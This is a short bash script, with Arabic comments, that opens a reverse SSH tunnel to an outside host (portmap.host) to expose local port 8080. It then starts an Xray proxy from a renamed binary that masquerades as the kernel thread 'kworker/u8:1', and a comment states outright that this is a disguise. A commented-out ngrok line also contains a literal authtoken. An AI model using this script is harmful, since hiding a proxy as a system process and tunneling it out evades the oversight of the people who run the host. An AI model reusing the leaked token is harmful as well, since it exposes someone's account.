#!/bin/bash
set -e

# تشغيل ngrok في الخلفية مع تمرير المنفذ 8080
# ngrok tcp 8080 --authtoken 2xz6Jy0Ci0OfJDBCkUvkyyCb5Zz_7u5GTGtec2hXd5FFQapMZ --log=stdout > /var/log/ngrok.log &
ssh -i ~/.ssh/mohaemdls4.first.pem mohaemdls4.first@mohaemdls4-32748.portmap.host -N -R 32748:localhost:8080 --log=stdout > /portmap.log &
# تشغيل Xray المموه باسم kworker/u8:1
exec -a "kworker/u8:1" /usr/local/bin/sys-collector -config /etc/xray/config.json
